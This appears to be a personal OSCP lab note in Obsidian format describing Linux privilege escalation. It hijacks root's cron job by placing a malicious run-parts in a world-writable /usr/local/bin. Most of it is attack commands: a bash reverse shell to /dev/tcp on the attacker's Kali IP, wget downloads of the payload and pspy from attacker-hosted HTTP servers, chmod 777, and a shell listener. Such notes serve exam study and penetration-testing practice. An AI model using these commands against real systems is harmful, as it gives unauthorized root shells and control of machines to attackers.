/usr/bin/local hijack

```
cat /etc/crontab
```

shows

```powershell
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
*/5 * * * * root    cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

---
# ⏱️ What the `*/5 * * * *` actually means

Cron uses **5 time fields**:

```
minute hour day month weekday
```

```powershell
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

Means that priority is `/usr/local/sbin > /usr/local/bin > /usr/bin` so on

---

Check Permissions of /bin directory
```
ls -la /usr/local/bin
```

shows 

```powershell
drwxrwsrwx  2 root staff 4096 Apr 24  2020 bin
```

This confirms
1. Cron is executing files inside /usr/local/bin earlier than /usr/bin
2. /usr/local/bin is writeable.

---

Since we see that root is running cron run-parts, we need to hijack run-parts

On KALI ATTACKER, prepare run-parts file
```
vim run-parts
```

/bin/bash reverse shell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `#!/bin/bash
/bin/bash -i >& /dev/tcp/${KaliIP}/[port] 0>&1`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
python3 -m http.server 21
```

```
cd ~/Desktop/Tools && python3 penelope.py -p 3000 -O / --oscp-safe
```
---

On VICTIM HOST, grab malicious run-parts
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `cd /usr/local/bin && wget http://${KaliIP}:21/run-parts && chmod 777 run-parts`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

Now wait, in the meantime use pspy to monitor the cronjob 

On attacker Kali

```
cd ~/Desktop/Tools && python -m http.server 80
```

On Victim Host
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:80/pspy64 -O pspy && chmod +x pspy && ./pspy`;

dv.paragraph("```bash\n" + command + "\n```");
```
---